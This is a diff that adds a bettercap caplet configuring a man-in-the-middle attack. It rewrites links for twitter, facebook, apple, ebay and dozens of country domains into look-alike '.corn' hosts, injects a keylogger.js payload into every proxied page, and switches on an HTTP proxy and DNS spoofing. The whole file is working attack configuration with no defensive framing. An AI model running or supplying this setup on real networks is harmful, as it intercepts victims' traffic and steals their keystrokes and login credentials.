@@ -1,0 +1,14 @@
+set drule.log             /usr/local/share/bettercap/caplets/drule/ssl.log
+set drule.ignore          *
+set drule.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+set drule.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+set drule.obfuscate       false
+set drule.encode          false
+set drule.payloads        *:/usr/local/share/bettercap/caplets/drule/payloads/keylogger.js 
+
+
+set http.proxy.script  /usr/local/share/bettercap/caplets/drule/drule.js
+set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn, *.com, *.ar, *.au, *.be, *.br, *.io, *.vg, *.bg, *.ca, *.cn, *.cc, *.co, *.dk, *.eg, *.uk, *.co.uk, *.eu, *.fr, *.de, *.gr, *.nl, *.in, *.ir, *.ie, *.jp, *.jo, *.kr, *.co.il, *.fm, *.nz, *.pk, *.pl, *.ru, *.sh, *.sa, *.es, *.se, *.sz, *.tw, *.tv, *.ae, *.us
+
+http.proxy  on
+dns.spoof   on
